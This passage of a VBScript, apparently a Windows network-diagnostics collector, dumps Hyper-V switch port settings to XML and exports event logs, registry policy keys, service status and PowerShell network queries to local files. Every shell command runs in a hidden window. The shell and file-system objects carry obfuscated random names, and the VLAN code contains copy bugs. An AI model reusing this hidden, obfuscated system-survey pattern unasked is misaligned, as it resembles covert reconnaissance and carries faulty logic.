                    Call AddXmlNodeEntry(xmlDoc, "EnableDhcpGuard", onOffState(portSecurityData.EnableDhcpGuard+1), objPortSecurity, objPortEnableDhcpGuard)
                    Call AddXmlNodeEntry(xmlDoc, "EnableRouterGuard", onOffState(portSecurityData.EnableRouterGuard+1), objPortSecurity, objPortEnableRouterGuard)
                    Call AddXmlNodeEntry(xmlDoc, "MonitorMode", monitorModeArray(portSecurityData.MonitorMode), objPortSecurity, objPortMonitorMode)
                    Call AddXmlNodeEntry(xmlDoc, "MonitorSession", portSecurityData.MonitorSession, objPortSecurity, objPortMonitorSession)
                    Call AddXmlNodeEntry(xmlDoc, "TeamName", portSecurityData.TeamName, objPortSecurity, objPortTeamName)
                    Call AddXmlNodeEntry(xmlDoc, "TeamNumber", portSecurityData.TeamNumber, objPortSecurity, objPortTeamNumber)
                    Call AddXmlNodeEntry(xmlDoc, "VirtualSubnetId", portSecurityData.VirtualSubnetId, objPortSecurity, objPortVirtualSubnetId)
                    Call AddXmlNodeEntry(xmlDoc, "StormLimit", portSecurityData.StormLimit, objPortSecurity, objPortStormLimit)
                    Call AddXmlNodeEntry(xmlDoc, "DynamicIPAddressLimit", portSecurityData.DynamicIPAddressLimit, objPortSecurity, objPortDynamicIPAddressLimit)
                End If
                ' Port isolation setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortIsolationSettingData")
                If (queryResult.Count > 0) Then
                    Set portIsolationData = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "PortIsolation", null, objPort, objPortIsolation)
                    Call AddXmlNodeEntry(xmlDoc, "IsolationMode", isolationModeArray(portIsolationData.IsolationMode), objPortIsolation, objPortIsolationMode)
                    Call AddXmlNodeEntry(xmlDoc, "DefaultIsolationId", portIsolationData.DefaultIsolationId, objPortIsolation, objPortDefaultIsolationId)
                    Call AddXmlNodeEntry(xmlDoc, "AllowUntaggedTraffic", onOffState(portIsolationData.AllowUntaggedTraffic+1), objPortIsolation, objPortAllowUntaggedTraffic)
                    Call AddXmlNodeEntry(xmlDoc, "EnableMultiTenantStack", onOffState(portIsolationData.EnableMultiTenantStack+1), objPortIsolation, objPortEnableMultiTenantStack)
                End If
                ' Port routing domain setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortRoutingDomainSettingData")
                If (queryResult.Count > 0) Then
                    Call AddXmlNodeEntry(xmlDoc, "PortRoutingDomainList", null, objPort, objPortRoutingDomainList)
                    For each portRoutingDomainData in queryResult
                        Call AddXmlNodeEntry(xmlDoc, "PortRoutingDomainMapping", null, objPortRoutingDomainList, objPortRoutingDomain)
                        Call AddXmlNodeEntry(xmlDoc, "RoutingDomainGuid", portRoutingDomainData.RoutingDomainGuid, objPortRoutingDomain, objPortRoutingDomainGuid)
                        Call AddXmlNodeEntry(xmlDoc, "RoutingDomainName", portRoutingDomainData.RoutingDomainName, objPortRoutingDomain, objPortRoutingDomainName)
                        isolationIdString = ""
                        for each isolationId In portRoutingDomainData.IsolationIdList
                            isolationIdString = isolationIdString & isolationId & " "
                        Next
                        Call AddXmlNodeEntry(xmlDoc, "IsolationIdList", isolationIdString, objPortRoutingDomain, objPortIsolationIdList)
                        isolationIdNameString = ""
                        for each isolationIdName In portRoutingDomainData.IsolationIdNameList
                            isolationIdNameString = isolationIdNameString & isolationIdName & " "
                        Next
                        Call AddXmlNodeEntry(xmlDoc, "IsolationIdNameList", isolationIdNameString, objPortRoutingDomain, objPortIsolationIdNameList)
                    Next
                End If
                'Port VLAN setting
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortVlanSettingData")
                If (queryResult.Count > 0) Then
                    Set portVlanData = queryResult.ItemIndex(0)
                    Call AddXmlNodeEntry(xmlDoc, "PortVlan", null, objPort, objPortVlan)
                    Call AddXmlNodeEntry(xmlDoc, "VlanMode", vlanModeArray(portVlanData.OperationMode), objPortVlan, objPortVlanMode)
                    if (portVlanData.OperationMode = 1) Then
                        Call AddXmlNodeEntry(xmlDoc, "AccessVlanId", portVlanData.AccessVlanId, objPortVlan, objPortVlanAccess)
                    End If
                    if (portVlanData.OperationMode = 2) Then
                        Call AddXmlNodeEntry(xmlDoc, "NativeVlanId", portVlanData.NativeVlanId, objPortVlan, objPortVlanNative)
                        trunkVlanString = ""
                        for each trunkVlanId In portVlanData.TrunkVlanIdArray
                            trunkVlanString = trunkVlanString & trunkVlanId & " "
                        Next
                        Call AddXmlNodeEntry(xmlDoc, "TrunkVlanArray", trunkVlanString, objPortVlan, objPortVlanTrunk)
                        pruneVlanString = ""
                        for each prunevlanId In portVlanData.PruneVlanIdArray
                            tpruneVlanString = pruneVlanString & prunevlanId & " "
                        Next
                        Call AddXmlNodeEntry(xmlDoc, "PruneVlanArray", trunkVlanString, objPortVlan, objPortVlanPrune)
                    End If
                    if (portVlanData.OperationMode = 3) Then
                        Call AddXmlNodeEntry(xmlDoc, "PvlanMode", PvlanModeArray(portVlanData.PvlanMode), objPortVlan, objPortPVlanMode)
                        Call AddXmlNodeEntry(xmlDoc, "PrimaryVlanId", portVlanData.PrimaryVlanId, objPortVlan, objPortPrimaryVlanId)
                        Call AddXmlNodeEntry(xmlDoc, "SecondaryVlanId", portVlanData.SecondaryVlanId, objPortVlan, objPortSecondaryVlanId)
                        secondaryVlanString = ""
                        for each secondaryVlanId In portVlanData.SecondaryVlanIdArray
                            secondaryVlanString = secondaryVlanString & secondaryVlanId & " "
                        Next
                        Call AddXmlNodeEntry(xmlDoc, "SecondaryVlanArray", secondaryVlanString, objPortVlan, objPortVlanSecondary)
                    End If
                End If
                'Extended Port ACLs
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortExtendedAclSettingData")
                If (queryResult.Count > 0) Then
                    Call AddXmlNodeEntry(xmlDoc, "PortExtendedAclList", null, objPort, objPortEaclList)
                    for each extendedacl In queryResult
                        Call AddXmlNodeEntry(xmlDoc, "ExtendedAcl", null, objPortEaclList, objPortEacl)
                        Call AddXmlNodeEntry(xmlDoc, "Action", aclActionArray(extendedAcl.Action), objPortEacl, objPortEaclAction)
                        Call AddXmlNodeEntry(xmlDoc, "Direction", aclDirectionArray(extendedAcl.Direction), objPortEacl, objPortEaclDirection)
                        Call AddXmlNodeEntry(xmlDoc, "Weight", extendedAcl.Weight, objPortEacl, objPortEaclWeight)
                        Call AddXmlNodeEntry(xmlDoc, "Protocol", extendedAcl.Protocol, objPortEacl, objPortEaclProtocol)
                        Call AddXmlNodeEntry(xmlDoc, "LocalIPAddress", extendedAcl.LocalIPAddress, objPortEacl, objPortEaclLocalIP)
                        Call AddXmlNodeEntry(xmlDoc, "LocalPort", extendedAcl.LocalPort, objPortEacl, objPortEaclLocalPort)
                        Call AddXmlNodeEntry(xmlDoc, "RemoteIPAddress", extendedAcl.RemoteIPAddress, objPortEacl, objPortEaclRemoteIP)
                        Call AddXmlNodeEntry(xmlDoc, "RemotePort", extendedAcl.RemotePort, objPortEacl, objPortEaclRemotePort)
                        Call AddXmlNodeEntry(xmlDoc, "Stateful", onOffState(extendedAcl.Stateful+1), objPortEacl, objPortEaclStateful)
                        Call AddXmlNodeEntry(xmlDoc, "IsolationID", extendedAcl.IsolationID, objPortEacl, objPortEaclIsolationId)
                    Next
                End If
                'Port ACLs
                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortAclSettingData")
                If (queryResult.Count > 0) Then
                    Call AddXmlNodeEntry(xmlDoc, "PortAclList", null, objPort, objPortAclList)
                    for each acl In queryResult
                        Call AddXmlNodeEntry(xmlDoc, "Acl", null, objPortAclList, objPortAcl)
                        Call AddXmlNodeEntry(xmlDoc, "Action", aclActionArray(acl.Action), objPortAcl, objPortAclAction)
                        Call AddXmlNodeEntry(xmlDoc, "AclType", aclTypeArray(acl.AclType), objPortAcl, objPortAclType)
                        Call AddXmlNodeEntry(xmlDoc, "Applicability", aclApplicabilityArray(acl.Applicability), objPortAcl, objPortAclApplicability)
                        Call AddXmlNodeEntry(xmlDoc, "Direction", aclDirectionArray(acl.Direction), objPortAcl, objPortAclDirection)
                        Call AddXmlNodeEntry(xmlDoc, "LocalAddress", acl.LocalAddress, objPortAcl, objPortAclLocalAddress)
                        Call AddXmlNodeEntry(xmlDoc, "LocalAddressPrefixLength", acl.LocalAddressPrefixLength, objPortAcl, objPortAclLocalAddressPrefixLength)
                        Call AddXmlNodeEntry(xmlDoc, "RemoteAddress", acl.RemoteAddress, objPortAcl, objPortAclRemoteAddress)
                        Call AddXmlNodeEntry(xmlDoc, "RemoteAddressPrefixLength", acl.RemoteAddressPrefixLength, objPortAcl, objPortAclRemoteAddressPrefixLength)
                    Next
                End If

                'Connected NIC
                Set portLanEndPoint = port.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_LANEndpoint").ItemIndex(0)
                Set nicLanEndPoint = portLanEndPoint.Associators_("Msvm_ActiveConnection", "Msvm_LANEndpoint").ItemIndex(0)
                logNic = false

                'Synthetic NIC
                Set queryResult = nicLanEndPoint.Associators_("Msvm_DeviceSAPImplementation", "Msvm_SyntheticEthernetPort")
                If (queryResult.Count > 0) Then
                    Set nic = queryResult.ItemIndex(0)
                    nicType = 0
                    logNic = True
                End If
                
                'Emulated NIC
                Set queryResult = nicLanEndPoint.Associators_("Msvm_DeviceSAPImplementation", "Msvm_EmulatedEthernetPort")
                If (queryResult.Count > 0) Then
                    Set nic = queryResult.ItemIndex(0)
                    nicType = 1
                    logNic = True
                End If
                
                'Internal NIC
                Set queryResult = nicLanEndPoint.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_InternalEthernetPort")
                If (queryResult.Count > 0) Then
                    Set nic = queryResult.ItemIndex(0)
                    nicType = 2
                    logNic = True
                End If
                
                'External NIC
                Set queryResult = nicLanEndPoint.Associators_("Msvm_EthernetDeviceSAPImplementation", "Msvm_ExternalEthernetPort")
                If (queryResult.Count > 0) Then
                    Set nic = queryResult.ItemIndex(0)
                    nicType = 3
                    logNic = True
                End If
                
                If (logNic = True) Then 
                    Call AddXmlNodeEntry(xmlDoc, "Nic", null, objPort, objNic)
                    Call AddXmlNodeEntry(xmlDoc, "DeviceId", nic.DeviceId, objNic, objNicId)
                    Call AddXmlNodeEntry(xmlDoc, "NicType", nicTypeArray(nicType), objNic, objNicId)
                    If (IsNull(nic.NetworkAddresses) = False) Then
                        For Each networkAddress In nic.NetworkAddresses
                            Call AddXmlNodeEntry(xmlDoc, "NetworkAddress", networkAddress, objNic, objNicNetAddress)    
                        Next
                    End If
                    Call AddXmlNodeEntry(xmlDoc, "PermanentAddress", nic.PermanentAddress, objNic, objNicPermAddress)
                    Call AddXmlNodeEntry(xmlDoc, "ActiveMTU", nic.ActiveMaximumTransmissionUnit, objNic, objNicActiveMTU)
                    If (nicType = 0 Or nicType = 1) Then
                        Call AddXmlNodeEntry(xmlDoc, "VMId", nic.SystemName, objNic, objNicVmId)
                        strQuery = "Select * from MSVM_ComputerSystem WHERE Name='" + nic.SystemName + "'"
                        Set queryResult = objVirtualizationService.ExecQuery(strQuery)
                        If (queryResult.Count > 0) Then
                            Set vm = queryResult.ItemIndex(0)
                            Call AddXmlNodeEntry(xmlDoc, "VMName", vm.ElementName, objNic, objNicVmName)
                        End If
                    End If
                 End If 
            Next
        Next

        ' Disconnected NIC info
        strQueryArray = Array("Select * from MSVM_SyntheticEthernetPort", "Select * from MSVM_EmulatedEthernetPort")
        nicType = 0
        Call AddXmlNodeEntry(xmlDoc, "DisconnectedNics", null, objRoot, objDisconnectedNics)
        For Each strQuery in strQueryArray
            Set switchPort = objVirtualizationService.ExecQuery (strQuery)
            For Each nic In switchPort
                Set lanEndPoint = port.Associators_("Msvm_DeviceSAPImplementation", "Msvm_LANEndpoint")
                Set connectedlanEndPoint = lanEndPoint.Associators_("Msvm_ActiveConnection", "Msvm_LANEndpoint")
                if (connectedlanEndPoint.Count = 0) Then
                    Call AddXmlNodeEntry(xmlDoc, "Nic", null, objDisconnectedNics, objNic)
                    Call AddXmlNodeEntry(xmlDoc, "DeviceId", nic.DeviceId, objNic, objNicId)
                    Call AddXmlNodeEntry(xmlDoc, "NicType", nicTypeArray(nicType), objNic, objNicId)
                    If (IsNull(nic.NetworkAddresses) = False) Then
                        For Each networkAddress In nic.NetworkAddresses
                            Call AddXmlNodeEntry(xmlDoc, "NetworkAddress", networkAddress, objNic, objNicNetAddress)    
                        Next
                    End If
                    Call AddXmlNodeEntry(xmlDoc, "PermanentAddress", nic.PermanentAddress, objNic, objNicPermAddress)
                    Call AddXmlNodeEntry(xmlDoc, "ActiveMTU", nic.ActiveMaximumTransmissionUnit, objNic, objNicActiveMTU)
                    If (nicType = 0 Or nicType = 1) Then
                        Call AddXmlNodeEntry(xmlDoc, "VMId", nic.SystemName, objNic, objNicVmId)
                        strQuery = "Select * from MSVM_ComputerSystem WHERE Name='" + nic.SystemName + "'"
                        Set queryResult = objVirtualizationService.ExecQuery(strQuery)
                        If (queryResult.Count > 0) Then
                            Set vm = queryResult.ItemIndex(0)
                            Call AddXmlNodeEntry(xmlDoc, "VMName", vm.ElementName, objNic, objNicVmName)
                        End If
                    End If
                End If
            Next
            nicType = nicType + 1
        Next


        Set objIntro = xmlDoc.CreateProcessingInstruction ("xml", "version='1.0'")
        xmlDoc.insertBefore objIntro, xmlDoc.childNodes(0)
        xmlDoc.Save outputFileName

    Else 
        
    End If

End Sub

Sub GetVmswitchLog(vmswitchlogFileName, vmmslogFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the vmswitch events from system log
    cmd = "cmd /c wevtutil epl System /q:""*[System[Provider[@Name='Microsoft-Windows-Hyper-V-VmSwitch']]]"" " & vmswitchlogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & vmswitchlogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    'Export the VMMS networking log
    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Hyper-V-VMMS-Networking"" " & vmmslogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True   

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & vmmslogFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True       
End Sub

Sub GetApplicationExportLog(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the ApplicationExport log
    cmd = "cmd /c wevtutil epl Application " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetSystemExportLog(logFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    'Export the ApplicationExport log
    cmd = "cmd /c wevtutil epl System " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    'Archive the log so that it can be read on different machines
    cmd = "cmd /c wevtutil al " & logFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetHotFixInfo(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c wmic qfe >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetCreateBindingMap(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c netcfg -m >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetWinsockLog(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c reg.exe query hklm\system\CurrentControlSet\Services\Winsock\Parameters /v Transports >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c reg.exe query ""hklm\system\CurrentControlSet\Services\Winsock\Setup Migration"" /v ""Provider List"" >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c netsh.exe winsock show catalog >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetEpdPolicies(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\EnterpriseDataProtection\Policies " & outputFileName & " /y /Reg:64"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetPolicyManager(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\Providers " & outputFileName & " /y /Reg:64"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetHomeGroupListener(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HomeGroupListener " & outputFileName & " /y /Reg:64"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetHomeGroupProvider(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c Reg.exe Export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HomeGroupProvider " & outputFileName & " /y /Reg:64"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetServiceLogInfo(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "cmd /c sc.exe queryex nativewifip >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc.exe qc nativewifip >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc.exe queryex wlansvc >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc.exe qc wlansvc >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc.exe queryex dhcp >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    cmd = "cmd /c sc.exe qc dhcp >> " & outputFileName
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetPowershellInfo(outputFileName)
    On Error Resume Next

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )

    cmd = "powershell -command " & _
    "$net_adapter=(Get-NetAdapter -IncludeHidden); "  & _
    "$output= ($net_adapter); " & _
    "$output += ($net_adapter | fl *); " & _
    "$output += (Get-NetAdapterAdvancedProperty | fl); " & _
    "$net_adapter_bindings=(Get-NetAdapterBinding -IncludeHidden); " & _
    "$output += ($net_adapter_bindings); " & _
    "$output += ($net_adapter_bindings | fl); " & _
    "$output += (Get-NetIpConfiguration -Detailed); " & _
    "$output += (Get-DnsClientNrptPolicy); " & _
    "$output += (Resolve-DnsName bing.com); " & _
    "$output += (ping bing.com -4); " & _
    "$output += (ping bing.com -6); " & _
    "$output += (Test-NetConnection bing.com -InformationLevel Detailed); " & _
    "$output += (Test-NetConnection bing.com -InformationLevel Detailed -CommonTCPPort HTTP); " & _
    "$output += (Get-NetRoute); " & _
    "$output += (Get-NetIPaddress); " & _
    "$output += (Get-NetLbfoTeam); " & _
    "$output += (Get-Service -Name:VMMS); " & _
    "$output += (Get-VMSwitch); " & _
    "$output += ""(Get-VMNetworkAdapter -all)""; " & _
    "$output += (Get-DnsClientNrptPolicy); " & _
    "$output += (Get-WindowsOptionalFeature -Online); " & _
    "$output += (Get-Service | fl); " & _
    "$pnp_devices = (Get-PnpDevice); " & _
    "$output += ($pnp_devices); " & _
    "$output += ($pnp_devices | Get-PnpDeviceProperty -KeyName DEVPKEY_Device_InstanceId,DEVPKEY_Device_DevNodeStatus,DEVPKEY_Device_ProblemCode); " & _
    "$output | Out-File " & outputFileName

    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True
End Sub

Sub GetExistingFile(inputFileName, outputDirectory)
    On Error Resume Next

    dim outputPath

    outputPath = outputDirectory & "\"
    outputPath = Replace(outputPath, "\\", "\") 

    If DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FileExists(inputFileName) Then
        DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.CopyFile inputFileName, outputPath
    End If
End Sub

Sub GetExistingFiles(inputPath, outputPath, filePrefix, fileSuffix)
    On Error Resume Next

    exists = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FolderExists(inputpath)
    if (exists) then
        Set objFolder = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetFolder(inputpath)
        Set colFiles = objFolder.Files
        Set fileNameForCab = ""
        For Each objFile in colFiles
            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
                    fileNameForCab = Replace(objFile.Name, "%", "-")
                    DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & fileNameForCab
                end if
            end if
        Next
    end if
End Sub

Sub GetExistingFiles(inputPath, outputPath, filePrefix)
    On Error Resume Next

    exists = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FolderExists(inputpath)
    if (exists) then
        Set objFolder = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetFolder(inputpath)
        Set colFiles = objFolder.Files
        Set fileNameForCab = ""
        For Each objFile in colFiles
            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN                
                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
                    fileNameForCab = Replace(objFile.Name, "%", "-")
                    DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & fileNameForCab                
            end if
        Next
    end if
End Sub

Sub GetPantherFiles(inputPath, outputPath, outputFilePrefix, filePrefix, fileSuffix)
    On Error Resume Next

    exists = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FolderExists(inputpath)
    if (exists) then
        Set objFolder = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetFolder(inputpath)
        Set colFiles = objFolder.Files

        For Each objFile in colFiles
            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
                    Call GetExistingFile(inputPath & objFile.Name, outputPath)
                    'add prefix to output file to avoid copying over files with identical names
                    DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.MoveFile outputPath & "\" & objFile.Name, outputPath & "\" & outputFilePrefix & objFile.Name
                end if
            end if
        Next
    end if
End Sub

Sub GetWlanReport(outputPath)
    On Error Resume Next

    dim wlanOutputPath
    wlanOutputPath = shell.ExpandEnvironmentStrings("%programdata%\") & "Microsoft\Windows\WlanReport\"
    exists = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FolderExists(wlanOutputPath)
    if (exists) then
        Set objFolder = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetFolder(wlanOutputPath)
        objFolder.Delete True
    end if

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )
    cmd = "cmd /c netsh wlan show wlanreport"
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

    Set colFiles = objFolder.Files
    For Each objFile in colFiles
        Call GetExistingFile(wlanOutputPath & objFile.Name, outputPath)
    Next
End Sub

Sub GetBatteryReport(batteryReportFilename)
    On Error Resume Next
        
    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = WScript.CreateObject( "WScript.Shell" )
    cmd = "cmd /c powercfg.exe /batteryreport /output " & batteryReportFilename
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run cmd, 0, True

End Sub

Sub GetLatestNdfSessionEtlFile(inputPath, outputPath, filePrefix, fileSuffix)

    currentDirectory = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetAbsolutePathName(".")
    dirParts = Split(currentDirectory, "\")
    drive = dirParts(0)
    usersFolder = dirParts(1)
    username = dirParts(2)
    fullInputPath = drive + "\" + usersFolder + "\" + username + "\" + inputPath

    exists = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.FolderExists(fullInputPath)
    if (exists) then
        Set objFolder = DXqHuWKNoNWqvUnKNAwAwGPHGGWCWQCzHKYWocUINAIKcWqI.GetFolder(fullInputPath)
        Set colFiles = objFolder.Files
        Set mostRecent = Nothing
        For Each objFile in colFiles
            if Left(objFile.Name, Len(filePrefix)) = filePrefix  THEN
                if Right(objFile.Name, Len(fileSuffix)) = fileSuffix THEN
                    if (mostRecent is Nothing) THEN
                        Set mostRecent = objFile
                    elseif (objFile.DateLastModified > mostRecent.DateLastModified) THEN
                        Set mostRecent = objFile
                    end if
                end if
            end if
        Next
        if NOT (mostRecent is Nothing) THEN
            Call GetExistingFile(fullInputPath & mostRecent.Name, outputPath)
        end if
    end if
End Sub

On Error Resume Next

Dim adapterInfoFile, netInfoFile, WcnInfoFile

Set FSO = CreateObject("Scripting.FileSystemObject")
Set shell = WScript.CreateObject( "WScript.Shell" )
sysdrive = shell.ExpandEnvironmentStrings("%SystemDrive%\")
systemRoot = shell.ExpandEnvironmentStrings("%SystemRoot%\")

configFolder = "config"
osinfoFileName = configFolder + "\osinfo.txt"
adapterinfoFileName = configFolder + "\adapterinfo.txt"
envinfoFileName = configFolder + "\envinfo.txt"
wirelessAutoconfigLogFileName = configFolder + "\WLANAutoConfigLog.evtx"
wcmLogFileName = configFolder + "\WCMLog.evtx"
wwanLogFileName = configFolder + "\WWANLog.evtx"
wscatFileName = configFolder + "\WinsockCatalog.txt"
miracastFileName = configFolder + "\wlaninfo.txt"
wcnFileName = configFolder + "\WcnInfo.txt"
wcncachedumpFile= sysdrive + "\wcncachedump.txt"
windowsFirewallConfigFileName = configFolder + "\WindowsFirewallConfig.txt"
windowsFirewallEffectiveRulesFileName = configFolder + "\WindowsFirewallEffectiveRules.txt"
windowsFirewallLogFileName = configFolder + "\WindowsFirewallLog.evtx"
windowsFirewallConsecLogFileName = configFolder + "\WindowsFirewallConsecLog.evtx"
